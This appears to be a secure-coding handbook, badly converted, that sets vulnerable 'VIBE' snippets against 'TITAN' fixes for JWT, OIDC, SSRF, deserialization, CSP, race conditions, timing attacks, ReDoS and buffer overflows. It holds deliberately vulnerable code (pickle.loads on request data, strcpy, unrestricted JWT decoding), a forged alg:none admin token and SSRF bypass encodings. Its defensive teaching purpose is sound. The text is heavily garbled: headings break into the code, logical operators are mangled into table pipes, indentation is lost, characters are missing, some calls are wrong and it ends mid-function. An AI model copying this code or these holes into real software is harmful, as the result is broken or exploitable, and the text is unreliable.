// Sanitize if you must render HTML
import DOMPurify from 'dompurify';

function SanitizedHTML({ html }: { html: string }) {
const cleanHtml = DOMPurify.sanitize(html, {
ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

// Content Security Policy header
// next.config.js
const securityHeaders = [
  {
key: 'Content-Security-Policy',
value: `default-src 'self';
script-src 'self' 'unsafe-eval' 'unsafe-inline';
style-src 'self' 'unsafe-inline';
img-src 'self' blob: data:;
font-src 'self';
connect-src 'self' <<<<<<<https://api.example.com;>>>>>>>`.replace(/\s+/g, ' ').trim()
  }
];

## CSRF Protection 5

// csrf.ts - CSRF token generation and validation
import { randomBytes, createHmac } from 'crypto';

const SECRET = process.env.CSRF_SECRET!;

function generateCsrfToken(sessionId: string): string {
const timestamp = Date.now().toString(36);
const random = randomBytes(16).toString('hex');
const payload = `${sessionId}.${timestamp}.${random}`;
const signature = createHmac('sha256', SECRET)
    .update(payload)
    .digest('hex');

return `${payload}.${signature}`;
}

function validateCsrfToken(token: string, sessionId: string): boolean {
const parts = token.split('.');
if (parts.length !== 4) return false;

const [tokenSession, timestamp, random, signature] = parts;

if (tokenSession !== sessionId) return false;

// Check token age (1 hour max)
const tokenAge = Date.now() - parseInt(timestamp, 36);
if (tokenAge > 3600000) return false;

const payload = `${tokenSession}.${timestamp}.${random}`;
const expectedSig = createHmac('sha256', SECRET)
    .update(payload)
    .digest('hex');

return signature === expectedSig;
}

// Middleware
function csrfMiddleware(req: Request, res: Response, next: NextFunction) {
if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
const token = req.headers['x-csrf-token'] as string;
const sessionId = req.session?.id;

| if (!token | !sessionId | !validateCsrfToken(token, sessionId)) { |
return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
}

## Password Hashing 2

import { hash, verify } from '@node-rs/argon2';

// Hash password on registration
async function hashPassword(password: string): Promise<string> {
return hash(password, {
memoryCost: 65536, // 64 MB
timeCost: 3,
parallelism: 4,
outputLen: 32,
  });
}

// Verify password on login
async function verifyPassword(
password: string,
hashedPassword: string
): Promise<boolean> {
try {
return await verify(hashedPassword, password);
} catch {
return false;
  }
}

// Password strength validation
const passwordSchema = z
  .string()
.min(8, 'Password must be at least 8 characters')
  .max(100)
.regex(/[A-Z]/, 'Password must contain an uppercase letter')
.regex(/[a-z]/, 'Password must contain a lowercase letter')
.regex(/[0-9]/, 'Password must contain a number')
.regex(/[^A-Za-z0-9]/, 'Password must contain a special character');

## API Key Security

    import { randomBytes, createHash } from 'crypto';
    
    // Generate API key
    function generateApiKey(): { key: string; hash: string } {
    const key = `sk_live_${randomBytes(24).toString('base64url')}`;
    const hash = createHash('sha256').update(key).digest('hex');
    
    return { key, hash }; // Store hash in DB, return key to user once
    }
    
    // Validate API key
    | async function validateApiKey(key: string): Promise<User | null> { |
    const hash = createHash('sha256').update(key).digest('hex');
    
    const apiKey = await db.apiKey.findUnique({
    where: { hash },
    include: { user: true },
      });
    
    | if (!apiKey |  | apiKey.revoked) return null; |
    
    // Update last used
    await db.apiKey.update({
    where: { id: apiKey.id },
    data: { lastUsedAt: new Date() },
      });
    
    return apiKey.user;
    }
    
    // API key middleware
    async function apiKeyAuth(req: Request, res: Response, next: NextFunction) {
    const authHeader = req.headers.authorization;
    
    if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing API key' });
      }
    
    const key = authHeader.slice(7);
    const user = await validateApiKey(key);
    
    if (!user) {
    return res.status(401).json({ error: 'Invalid API key' });
      }
    
    req.user = user;
      next();
    }
    

---

### END OF SECURITY PATTERNS

    
    ## VOLUME 6: DATABASE PRODUCTION FAILURES
    
    ## VOLUME 1.5: TITAN VAULT - SUPPLY CHAIN & IDENTITY ATTACKS 2
    
    ## JWT ALGORITHM CONFUSION ATTACK 2
    
    ### RS256 to HS256 Downgrade Scar 2
    
    > "JWT signed with RS256 (asymmetric). Server also accepts HS256 (symmetric).
    > Attacker changes alg header to HS256.
    > Uses PUBLIC KEY as HMAC secret. Signs forged token.
    > Server verifies with public key as secret = VALID. Full account takeover."
    
    ## TITAN: Strict Algorithm Enforcement 2
    
    import jwt
    
    def verify_token_secure(token: str, public_key: str) -> dict:
            """
    NEVER trust the 'alg' header from the token itself.
    Explicitly specify allowed algorithms.
            """
            try:
    
    ## CRITICAL: algorithms parameter is a WHITELIST 2
    
    return jwt.decode(
            token,
            public_key,
    algorithms=["RS256"], # NEVER include HS256
            audience="my-app",
            issuer="<<<<<<https://auth.company.com">>>>>>
            )
    except jwt.InvalidAlgorithmError:
    raise SecurityException("Algorithm mismatch - possible attack")
    except jwt.ExpiredSignatureError:
    raise SecurityException("Token expired")
    
    ## Additional JWT Pitfalls 2
    
    > "1. 'none' algorithm: Token with alg='none' and no signature
    > 2. Kid injection: kid header used in SQL query = SQLi
    > 3. JKU spoofing: jku points to attacker-controlled JWKS URL"
    
    ## OPENID CONNECT VULNERABILITIES 2
    
    ### OIDC State Fixation Scar 2
    
    > "Missing or predictable 'state' parameter.
    > Attacker initiates OAuth flow, captures redirect URL.
    > Tricks victim into clicking. Victim's browser completes auth.
    > Attacker's session now has victim's identity."
    
    // TITAN: Secure OIDC Implementation
    import { randomBytes } from 'crypto';
    
    async function initiateOIDCLogin(req: Request, res: Response) {
    // Generate cryptographically random state
    const state = randomBytes(32).toString('base64url');
    const nonce = randomBytes(32).toString('base64url');
    
    // Store with short TTL - bound to user's session
    await redis.setex(`oidc:state:${state}`, 300, JSON.stringify({
    ip: req.ip,
    userAgent: req.headers['user-agent'],
    nonce: nonce
            }));
    
    const authUrl = new URL('<<<<<<https://idp.example.com/authorize>>>>>>');
    authUrl.searchParams.set('response_type', 'code');
    authUrl.searchParams.set('client_id', CLIENT_ID);
    authUrl.searchParams.set('redirect_uri', REDIRECT_URI);
    authUrl.searchParams.set('scope', 'openid email profile');
    authUrl.searchParams.set('state', state);
    authUrl.searchParams.set('nonce', nonce);
    
            res.redirect(authUrl.toString());
        }
    
    async function handleOIDCCallback(req: Request, res: Response) {
    const { state, code } = req.query;
    
    // Verify state matches what we stored
    const stored = await redis.get(`oidc:state:${state}`);
    if (!stored) {
    throw new SecurityException("Invalid or expired state");
            }
    
    const { ip, userAgent, nonce } = JSON.parse(stored);
    
    // Verify request comes from same context
    | if (ip !== req.ip | userAgent !== req.headers['user-agent']) { |
    throw new SecurityException("Session binding mismatch");
            }
    
    // Delete state immediately (one-time use)
    await redis.del(`oidc:state:${state}`);
    
    // Exchange code for tokens and verify nonce in id_token
    const tokens = await exchangeCode(code);
    const idToken = jwt.decode(tokens.id_token);
    
    if (idToken.nonce !== nonce) {
    throw new SecurityException("Nonce mismatch - replay attack");
            }
        }
    
    ## DEPENDENCY CONFUSION ATTACK 2
    
    ### Private Package Hijacking Scar 2
    
    > "Company uses internal package 'analytics-internal'.
    > Attacker publishes 'analytics-internal' on public npm.
    > Build system checks public registry FIRST with higher version.
    > Downloads malicious package. Executes in CI/CD. Full supply chain compromise."
    
    ## TITAN: npm Registry Scoping 2
    
    ## .npmrc - Force scoped packages to private registry 2
    
        @mycompany:registry=<<<<<<https://npm.mycompany.com/>>>>>>
        //npm.mycompany.com/:_authToken=${NPM_TOKEN}
    
    ## For all internal packages, use scope 2
    
    ## @mycompany/analytics-internal (cannot be confused) 2
    
    ## TITAN: Python pip.conf for private packages 2
    
    ## pip.conf 2
    
    [global]
    index-url = <<<<<<https://pypi.mycompany.com/simple/>>>>>>
    extra-index-url = <<<<<<https://pypi.org/simple/>>>>>>
    
    ## CRITICAL: Prefer private index 2
    
    ## Private packages should use unique naming 2
    
    ## E.g., mycompany-analytics, mycompany-utils 2
    
    ## Detection 3
    
    ## Audit for public packages matching internal names 2
    
    | npm info mycompany-internal 2>&1 | grep -q "404" | echo "ALERT: Name exists on public npm!" |
    
    ## CERTIFICATE CHAIN VALIDATION FAILURES 2
    
    ## Incomplete Chain Scar 2
    
    > "Leaf certificate valid. Browser shows HTTPS lock.
    > Mobile app fails: missing intermediate certificate.
    > Server sends only leaf cert. Some clients can't build chain to root."
    
    ## TITAN: Full Chain Validation 2
    
    import ssl
    import socket
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    
    def verify_full_chain(hostname: str, port: int = 443) -> dict:
        """
    Verify complete certificate chain is served.
        """
    context = ssl.create_default_context()
    
    with socket.create_connection((hostname, port)) as sock:
    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
    
    ## Get full chain 2
    
    chain = ssock.getpeercert(binary_form=True)
    certs = ssock.get_peer_cert_chain()
    
    if len(certs) < 2:
    return {
    "valid": False,
    "error": "Incomplete chain - missing intermediates",
    "chain_length": len(certs)
            }
    
    ## Verify each cert signs the next 2
    
    for i in range(len(certs) - 1):
    cert = x509.load_der_x509_certificate(certs[i], default_backend())
    issuer = x509.load_der_x509_certificate(certs[i + 1], default_backend())
    
    ## Verify issuer matches 2
    
    if cert.issuer != issuer.subject:
    return {
    "valid": False,
    "error": f"Chain break at position {i}"
            }
    
    return {
    "valid": True,
    "chain_length": len(certs),
    "leaf_subject": certs[0].subject
            }
    
    ## CONSTANT-TIME STRING COMPARISON 2
    
    ## Timing Attack Exploitation 2
    
    > "strcmp returns on first mismatch. Fast = wrong first byte.
    > Attacker times 256 requests per byte position.
    > Fastest response = correct byte. HMAC leaked byte-by-byte."
    
    ## TITAN: Constant-Time Comparison 3
    
    import hmac
    import secrets
    
    def secure_compare(a: bytes, b: bytes) -> bool:
        """
    Compare two byte strings in constant time.
    Uses HMAC to prevent timing attacks.
        """
    
    ## Method 1: Double HMAC (paranoid) 2
    
    ## Random key prevents length-extension attacks 2
    
    key = secrets.token_bytes(32)
    return hmac.compare_digest(
    hmac.digest(key, a, 'sha256'),
    hmac.digest(key, b, 'sha256')
        )
    
    def verify_api_key(provided: str, stored_hash: str) -> bool:
        """
    Verify API key without timing leakage.
        """
    
    ## Hash the provided key first (prevents length leakage) 2
    
    provided_hash = hashlib.sha256(provided.encode()).hexdigest()
    
    ## Constant-time comparison of hashes 2
    
    return secrets.compare_digest(provided_hash, stored_hash)
    
    ## END OF VOLUME 1.5: TITAN SUPPLY CHAIN & IDENTITY ATTACKS 2
    
    ## VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS 2
    
    ## OAUTH 2.0: PKCE MANDATORY 2
    
    ### Authorization Code Interception 2
    
    > "Mobile app: Can't store client secret securely.
    > Authorization code intercepted on redirect.
    > Attacker exchanges code for token.
    > PKCE: Code Verifier proves you initiated the request."
    
    ## TITAN: PKCE Implementation 2
    
    import secrets
    import hashlib
    import base64
    
    class PKCEClient:
    def generate_verifier(self):
    
    ## 43-128 chars, cryptographically random 2
    
    self.verifier = base64.urlsafe_b64encode(
            secrets.token_bytes(32)
            ).rstrip(b'=').decode('ascii')
    return self.verifier
    
    def generate_challenge(self):
    
    ## S256: SHA256 hash of verifier, base64url encoded 2
    
    digest = hashlib.sha256(self.verifier.encode('ascii')).digest()
    self.challenge = base64.urlsafe_b64encode(digest).rstrip(b'=').decode('ascii')
    return self.challenge
    
    def build_auth_url(self, auth_endpoint, client_id, redirect_uri, scope):
            self.generate_verifier()
            self.generate_challenge()
    
    params = {
    'response_type': 'code',
    'client_id': client_id,
    'redirect_uri': redirect_uri,
    'scope': scope,
    'code_challenge': self.challenge,
    'code_challenge_method': 'S256',
    'state': secrets.token_urlsafe(16)  # CSRF protection
            }
    return f"{auth_endpoint}?" + urlencode(params)
    
    def exchange_code(self, token_endpoint, code, client_id, redirect_uri):
    
    ## Include verifier in token request 2
    
    response = requests.post(token_endpoint, data={
    'grant_type': 'authorization_code',
    'code': code,
    'client_id': client_id,
    'redirect_uri': redirect_uri,
    'code_verifier': self.verifier  # Server verifies this
            })
    return response.json()
    
    ## SSRF BYPASS TECHNIQUES 2
    
    ## IP Address Bypass Scar 2
    
    > "SSRF filter blocks 127.0.0.1 and localhost.
    > Attacker uses: 0177.0.0.1 (octal), 2130706433 (decimal), 0x7f.0.0.1 (hex).
    > Or: DNS rebinding - first request resolves external, second resolves internal.
    > Defense in depth: Block at network level + resolve before fetch."
    
    ## TITAN: Comprehensive SSRF Protection 2
    
    import socket
    import ipaddress
    from urllib.parse import urlparse
    
    BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'), # Loopback
    ipaddress.ip_network('10.0.0.0/8'), # Private
    ipaddress.ip_network('172.16.0.0/12'), # Private
    ipaddress.ip_network('192.168.0.0/16'), # Private
    ipaddress.ip_network('169.254.0.0/16'), # Link-local (IMDS!)
    ipaddress.ip_network('::1/128'), # IPv6 loopback
    ipaddress.ip_network('fc00::/7'), # IPv6 private
    ]
    
    class SSRFSafeHTTPClient:
    def **init**(self):
    self.dns_cache = {}  # Pin DNS to prevent rebinding
    
    def is_safe_url(self, url):
    parsed = urlparse(url)
    hostname = parsed.hostname
    
    if not hostname:
    return False
    
    ## Block file:// and other dangerous schemes 2
    
    if parsed.scheme not in ('http', 'https'):
    return False
    
            try:
    
    ## Resolve BEFORE making request (prevents DNS rebinding) 2
    
    ip_str = socket.gethostbyname(hostname)
    ip = ipaddress.ip_address(ip_str)
    
    ## Check against blocklist 2
    
    for network in BLOCKED_NETWORKS:
    if ip in network:
    return False
    
    ## Cache DNS result to prevent rebinding between check and use 2
    
    self.dns_cache[hostname] = ip_str
    return True
    
    except socket.gaierror:
    return False
    
    def fetch(self, url):
    if not self.is_safe_url(url):
    raise SSRFError(f"Blocked URL: {url}")
    
    ## Use cached IP to prevent DNS rebinding 2
    
    parsed = urlparse(url)
    safe_url = url.replace(
            parsed.hostname,
    self.dns_cache.get(parsed.hostname, parsed.hostname)
            )
    
    return requests.get(safe_url, timeout=5)
    
    ## DESERIALIZATION ATTACKS 2
    
    ## Object Injection Deep Dive 2
    
    > "pickle.loads(): Executes arbitrary code during deserialization.
    > YAML: load() is unsafe. Use safe_load().
    > Java: Gadget chains in classpath = RCE.
    > Rule: Never deserialize untrusted data."
    
    ## VIBE: Arbitrary code execution 2
    
    import pickle
    data = request.get_json()['data']
    obj = pickle.loads(base64.b64decode(data))  # RCE!
    
    ## VIBE: YAML load is unsafe 2
    
    import yaml
    config = yaml.load(user_input)  # RCE via !!python/object
    
    ## TITAN: Safe alternatives 2
    
    import json
    
    ## JSON is safe (no code execution) 2
    
    obj = json.loads(user_input)
    
    ## If schema needed, use explicit parsing 2
    
    from pydantic import BaseModel
    
    class UserInput(BaseModel):
    name: str
    age: int
    
    validated = UserInput.parse_raw(user_input)
    
    ## If you MUST deserialize complex objects 2
    
    import jsonpickle
    jsonpickle.set_decoder_options('json', cls=SafeDecoder)
    
    ## Plus: Whitelist of allowed classes 2
    
    ## TITAN: Safe YAML 2
    
    import yaml
    
    ## Always use safe_load 2
    
    config = yaml.safe_load(user_input)
    
    ## For custom objects, be explicit 2
    
    class SafeLoader(yaml.SafeLoader):
            pass
    
    ## Only allow specific types 2
    
    SafeLoader.yaml_constructors = {
    'tag:yaml.org,2002:map': SafeLoader.construct_yaml_map,
    'tag:yaml.org,2002:str': SafeLoader.construct_yaml_str,
    'tag:yaml.org,2002:int': SafeLoader.construct_yaml_int,
        }
    
    config = yaml.load(user_input, Loader=SafeLoader)
    
    ## CSP BYPASS TECHNIQUES 2
    
    ## Content Security Policy Evasion 2
    
    > "CSP blocks inline scripts. But: JSONP endpoints, Angular ng-csp, base-uri hijacking.
    > 'unsafe-eval' allows eval(). 'unsafe-inline' defeats purpose.
    > Nonce-based CSP: Only scripts with matching nonce execute."
    
    <!-- VIBE: Overly permissive CSP -->
    <meta http-equiv="Content-Security-Policy"
    content="script-src 'self' <<<<<<https://cdn.example.com">>>>>>>
    <!-- Attacker finds JSONP on cdn.example.com XSS -->
    
    <!-- TITAN: Strict nonce-based CSP -->
    <meta http-equiv="Content-Security-Policy"
    content="default-src 'self';
    script-src 'nonce-R4nd0mN0nc3' 'strict-dynamic';
    style-src 'self' 'unsafe-inline';
    base-uri 'self';
    form-action 'self';">
    
    <!-- Only this script executes -->
    <script nonce="R4nd0mN0nc3">
    // Legitimate code
        </script>
    
    ## TITAN: Server-side nonce generation 2
    
    import secrets
    
    def generate_csp_nonce():
    return secrets.token_urlsafe(16)
    
    @app.before_request
    def set_csp():
    nonce = generate_csp_nonce()
    g.csp_nonce = nonce
    
    @app.after_request
    def add_csp_header(response):
    csp = (
    f"default-src 'self'; "
    f"script-src 'nonce-{g.csp_nonce}' 'strict-dynamic'; "
    f"style-src 'self' 'unsafe-inline'; "
    f"base-uri 'self'; "
    f"form-action 'self'; "
    f"frame-ancestors 'none'; "
            f"upgrade-insecure-requests"
        )
    response.headers['Content-Security-Policy'] = csp
    return response
    
    ## RACE CONDITION VULNERABILITIES 2
    
    ## Time-of-Check to Time-of-Use (TOCTOU) 2
    
    > "Check balance: $100. Debit: $50. User sends 2 requests simultaneously.
    > Both checks pass (both see $100). Both debits succeed. Balance: -$50.
    > Race window: Between read and write.
    > Fix: Atomic operations or database-level locking."
    
    ## VIBE: Race condition vulnerable 2
    
    async def transfer(from_account, to_account, amount):
    
    ## Check 2
    
    balance = await db.get_balance(from_account)
    if balance >= amount:  # Race window starts
    
    ## Time 2
    
    await db.update_balance(from_account, balance - amount)
    await db.update_balance(to_account, amount)  # Race window ends
    return True
    return False
    
    ## TITAN: Atomic operation with row locking 2
    
    async def transfer(from_account, to_account, amount):
    async with db.transaction():
    
    ## SELECT FOR UPDATE locks the row 2
    
    result = await db.execute("""
    UPDATE accounts
    SET balance = balance - $1
    WHERE id = $2 AND balance >= $1
    RETURNING balance
    """, amount, from_account)
    
    if result.rowcount == 0:
    raise InsufficientFunds()
    
    await db.execute("""
    UPDATE accounts
    SET balance = balance + $1
    WHERE id = $2
    """, amount, to_account)
    
    ## TITAN: Optimistic locking with version 2
    
    async def update_with_cas(id, expected_version, new_data):
    result = await db.execute("""
    UPDATE records
    SET data = $1, version = version + 1
    WHERE id = $2 AND version = $3
    """, new_data, id, expected_version)
    
    if result.rowcount == 0:
    raise ConcurrentModificationError("Retry required")
    
    ## END OF VOLUME 1.6: TITAN DEEP INTERNALS - APPLICATION SECURITY MECHANICS 2
    
    ## VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS 2
    
    ## JWT NONE ALGORITHM ATTACK 2
    
    ### The Scar 5 2 2
    
    > "JWT library accepts 'alg': 'none'.
    > Attacker forges token without signature. Backend trusts it.
    > Full authentication bypass. All users compromised."
    
    ## VIBE: Accepts any algorithm 2
    
    import jwt
    
    def verify_token(token):
    
    ## VULNERABLE: algorithms not specified! 2
    
    payload = jwt.decode(token, secret_key)  # Accepts 'none'!
    return payload
    
    ## Attacker creates 2
    
    ## Header: {"alg": "none", "typ": "JWT"} 2
    
    ## Payload: {"sub": "admin", "role": "superuser"} 2
    
    ## Signature: (empty) 2
    
    ## Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcnVzZXIifQ 2
    
    ## TITAN: Explicit algorithm whitelist 2
    
    import jwt
    from jwt.exceptions import InvalidAlgorithmError
    
    ALLOWED_ALGORITHMS = ['RS256', 'ES256']  # NEVER 'none', NEVER 'HS256' with RSA key
    
    def verify_token(token: str, public_key: str):
            try:
    payload = jwt.decode(
            token,
            public_key,
    algorithms=ALLOWED_ALGORITHMS, # EXPLICIT whitelist!
            options={
    'require': ['exp', 'iat', 'sub'],  # Required claims
    'verify_exp': True,
    'verify_iat': True
            }
            )
    return payload
    except jwt.InvalidTokenError as e:
    raise AuthenticationError(f"Invalid token: {e}")
    
    ## TITAN: Prevent algorithm confusion (RS256 vs HS256) 2
    
    ## If using RS256 (asymmetric), attacker might 2
    
    ## 1. Get public key (often exposed) 2
    
    ## 2. Sign token with HS256 using public key as secret 2
    
    ## 3. Server verifies with same "secret" = valid signature! 2
    
    ## Defense: NEVER use same key handling for both 2
    
    def verify_token_safe(token: str):
    header = jwt.get_unverified_header(token)
    
    if header['alg'] not in ALLOWED_ALGORITHMS:
    raise AuthenticationError(f"Algorithm not allowed: {header['alg']}")
    
    ## Use correct key based on algorithm 2
    
    if header['alg'].startswith('RS') or header['alg'].startswith('ES'):
    key = PUBLIC_KEY
            else:
    key = HMAC_SECRET
    
    return jwt.decode(token, key, algorithms=[header['alg']])
    
    ## TIMING ATTACKS AGAINST STRING COMPARISON 2
    
    ## The Scar 7
    
    > "API key verification uses '==' comparison.
    > Attacker measures response time for each character.
    > Correct prefix = slightly longer response time.
    > Extract full API key one character at a time."
    
    ## VIBE: Timing-vulnerable comparison 2
    
    def verify_api_key(provided_key, stored_key):
    return provided_key == stored_key  # VULNERABLE!
    
    ## First character mismatch: ~100ns 2
    
    ## Last character mismatch: ~1000ns 2
    
    ## Attacker can detect the difference! 2
    
    ## VIBE: Early return on mismatch 2
    
    def verify_api_key_bad(provided, stored):
    if len(provided) != len(stored):
    return False
    for i in range(len(provided)):
    if provided[i] != stored[i]:
    return False  # Returns early = timing leak!
    return True
    
    ## TITAN: Constant-time comparison 4
    
    import hmac
    import secrets
    
    def verify_api_key(provided_key: str, stored_key: str) -> bool:
    
    ## hmac.compare_digest is constant-time 2
    
    ## Takes same time regardless of where mismatch occurs 2
    
    return hmac.compare_digest(
            provided_key.encode('utf-8'),
            stored_key.encode('utf-8')
        )
    
    ## TITAN: For hashed passwords, use dedicated library 2
    
    from passlib.hash import argon2
    
    def verify_password(provided: str, hashed: str) -> bool:
    
    ## argon2.verify is constant-time internally 2
    
    return argon2.verify(provided, hashed)
    
    ## TITAN: Node.js constant-time comparison 2
    
    ## const crypto = require('crypto'); 2
    
    ## 4
    
    ## function verifyApiKey(provided, stored) { 2
    
    ## // crypto.timingSafeEqual is constant-time 2
    
    ## const a = Buffer.from(provided); 2
    
    ## const b = Buffer.from(stored); 2
    
    ## 5
    
    ## if (a.length !== b.length) { 2
    
    ## // Still compare to prevent length oracle 2
    
    ## return crypto.timingSafeEqual(a, a) && false; 2
    
    ## } 3 2
    
    ## 6
    
    ## return crypto.timingSafeEqual(a, b); 2
    
    ## } 4 2
    
    ## REDOS - REGEX DENIAL OF SERVICE 2
    
    ## The Scar 8
    
    > "Email validation regex: ^([a-zA-Z0-9]+)+@example.com$
    > Attacker input: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaa!'
    > Regex engine backtracks 2^28 times. Server hangs.
    > CPU 100% for minutes on single request."
    
    ## VIBE: Catastrophic backtracking patterns 2
    
    import re
    
    ## These regexes have exponential backtracking 2
    
    BAD_EMAIL = r'^([a-zA-Z0-9]+)+@'  # Nested quantifiers
    BAD_URL = r'^(https?://)?(\w+\.)+\w+$'  # Nested quantifiers
    BAD_HTML = r'<.*>.*</.*>'  # Greedy with overlap
    
    def validate_email(email):
    
    ## With input: 'a' *30 + '!' 2
    
    ## Takes MINUTES to return False 2
    
    return re.match(BAD_EMAIL + r'example\.com$', email)
    
    ## TITAN: Safe regex patterns 2
    
    import re
    
    ## Use possessive quantifiers or atomic groups (not in Python re) 2
    
    ## Or rewrite to avoid nested quantifiers 2
    
    ## Safe email validation (no nested quantifiers) 2
    
    SAFE_EMAIL = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    
    ## TITAN: Use regex with timeouts 2
    
    import signal
    
    class TimeoutError(Exception):
            pass
    
    def timeout_handler(signum, frame):
    raise TimeoutError("Regex timeout")
    
    def safe_regex_match(pattern, string, timeout=1):
    signal.signal(signal.SIGALRM, timeout_handler)
            signal.alarm(timeout)
            try:
    return re.match(pattern, string)
    except TimeoutError:
    return None
            finally:
            signal.alarm(0)
    
    ## TITAN: Use linear-time regex engine 2
    
    import google_re2 as re2  # Google RE2 guarantees linear time
    
    def validate_input(pattern, text):
    
    ## RE2 uses finite automata, no backtracking 2
    
    ## Guaranteed O(n) time complexity 2
    
    return re2.match(pattern, text)
    
    ## TITAN: Pre-validate input length 2
    
    MAX_INPUT_LENGTH = 1000
    
    def validate_with_guard(pattern, text):
    if len(text) > MAX_INPUT_LENGTH:
    raise ValueError("Input too long")
    return re.match(pattern, text)
    
    ## UNICODE NORMALIZATION ATTACKS 2
    
    ## The Scar 9
    
    > "Username filter blocks 'admin'. Attacker registers (script
    > After Unicode normalization, displays as 'admin'.
    > Or: File path with %c0%ae%c0%ae becomes '..' after normalization.
    > Directory traversal bypasses security filter."
    
    ## VIBE: Filter before normalization 2
    
    def check_username(username):
    if username.lower() == 'admin':
    raise ValueError("Reserved username")
    
    ## Save to database (which normalizes Unicode) 2
    
    return username
    
    ## Attacker passes: (circled letters) 2
    
    ## Filter passes. Database normalizes to 'admin' 2
    
    ## TITAN: Normalize BEFORE checking 2
    
    import unicodedata
    
    def sanitize_username(username: str) -> str:
    
    ## Normalize to NFKC (compatibility composition) 2
    
    ## Converts l, a, III, etc. 2
    
    normalized = unicodedata.normalize('NFKC', username)
    
    ## Remove zero-width characters (invisible) 2
    
    ## U+200B (zero-width space), U+200C (ZWNJ), U+200D (ZWJ), U+FEFF (BOM) 2
    
    invisible_chars = ['\u200b', '\u200c', '\u200d', '\ufeff', '\u00ad']
    for char in invisible_chars:
    normalized = normalized.replace(char, '')
    
    ## Now check against reserved names 2
    
    if normalized.lower() in ['admin', 'root', 'system']:
    raise ValueError("Reserved username")
    
    return normalized
    
    ## TITAN: Confusable character detection 2
    
    from confusables import is_confusable, normalize
    
    def check_homograph(input_str, protected_str):
    
    ## Detect visually similar characters 2
    
    ## (Cyrillic vs 'paypal.com' (Latin 'a') 2
    
    return is_confusable(input_str, protected_str)
    
    ## TITAN: Locale-aware case conversion (Turkish problem) 2
    
    def safe_lowercase(text: str, locale: str = 'en') -> str:
    
    ## Turkish: 'I'.lower() should be (dotless i), not 'i' 2
    
    ## Don't use .lower() for security comparisons! 2
    
    import icu  # PyICU
    return icu.UnicodeString(text).toLower(icu.Locale(locale))
    
    ## BUFFER OVERFLOW PREVENTION PATTERNS 2
    
    ## The Scar 10
    
    > "C function uses strcpy() without bounds checking.
    > Attacker input overwrites return address.
    > Arbitrary code execution. Full system compromise."
    
    // VIBE: Unbounded copy
    void vulnerable(char*input) {
    char buffer[64];
    strcpy(buffer, input);  // No bounds checking!
    }
    
    // VIBE: Off-by-one in loop
    void off_by_one(char *input) {
    char buffer[64];
    for (int i = 0; i <= 64; i++) {  // Should be < 64
    buffer[i] = input[i];
        }
    }
    
    // TITAN: Bounded string operations
    
    ## include <string.h> 2
    
    void safe_copy(char *input) {
    char buffer[64];
    
    // strncpy with explicit size
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0';  // Ensure null termination
    
    // Or use strlcpy (BSD) / strcpy_s (Windows)
    // strlcpy(buffer, input, sizeof(buffer));
        }
    
    // TITAN: Use stack canaries and ASLR
    // Compile with:
    // gcc -fstack-protector-all -pie -fPIE -D_FORTIFY_SOURCE=2 program.c
    
    // TITAN: In Rust, memory safety by default
    // fn safe_buffer(input: &str) -> String {
    // let mut buffer = String::with_capacity(64);
    // buffer.push_str(&input[..input.len().min(64)]);
    // buffer
    // }
    
    ## END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS 2
    
    ## VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION 2
    
    ## JWT SECURITY PITFALLS 2
    
    ### The Scar 6 2
    
    > "JWT token validated signature. Accepted `alg: none`.
    > Attacker removes signature, sets alg to 'none'.
    > Token accepted. Admin access granted.
    > Library had algorithm confusion vulnerability."
    
    // VIBE: Accept any algorithm
    import jwt from 'jsonwebtoken';
    
    function verifyToken(token: string) {
    return jwt.verify(token, SECRET_KEY);  // Accepts ANY algorithm!
        }
    // Attacker sets header: {"alg": "none"}, removes signature = valid token
    
    // TITAN: Strict JWT verification
    import jwt, { JwtPayload, Algorithm } from 'jsonwebtoken';
    
    interface TokenPayload extends JwtPayload {
    sub: string;
    role: string;
    permissions: string[];
    }
    
    class JWTService {
    private readonly secretKey: string;
    private readonly allowedAlgorithms: Algorithm[] = ['HS256', 'HS384', 'HS512'];
    private readonly issuer: string;
    private readonly audience: string;
    
    constructor(config: {
    secretKey: string;
    issuer: string;
    audience: string;
    }) {
    this.secretKey = config.secretKey;
    this.issuer = config.issuer;
    this.audience = config.audience;
        }
    
    | sign(payload: Omit<TokenPayload, 'iat' | 'exp' | 'iss' | 'aud'>): string { |
    return jwt.sign(
            {
            ...payload,
    iss: this.issuer,
    aud: this.audience,
            },
            this.secretKey,
            {
    algorithm: 'HS256',  // Explicit algorithm
    expiresIn: '15m',    // Short-lived access tokens
    notBefore: 0,  // Valid immediately
            }
            );
        }
    
    verify(token: string): TokenPayload {
    try {
    const decoded = jwt.verify(token, this.secretKey, {
    algorithms: this.allowedAlgorithms,  // CRITICAL: Whitelist algorithms
    issuer: this.issuer,  // Verify issuer
    audience: this.audience,  // Verify audience
    clockTolerance: 30,  // 30 second tolerance
    }) as TokenPayload;
    
    // Additional checks
    | if (!decoded.sub | typeof decoded.sub !== 'string') { |
    throw new Error('Invalid subject claim');
            }
    
    return decoded;
    
    } catch (error) {
    if (error instanceof jwt.TokenExpiredError) {
    throw new AuthError('Token expired', 'TOKEN_EXPIRED');
            }
    if (error instanceof jwt.JsonWebTokenError) {
    throw new AuthError('Invalid token', 'INVALID_TOKEN');
            }
    throw error;
            }
        }
    
    // Refresh token with rotation
    createRefreshToken(userId: string): string {
    const tokenId = crypto.randomUUID();
    
    // Store in database for revocation
    await this.tokenStore.save({
    id: tokenId,
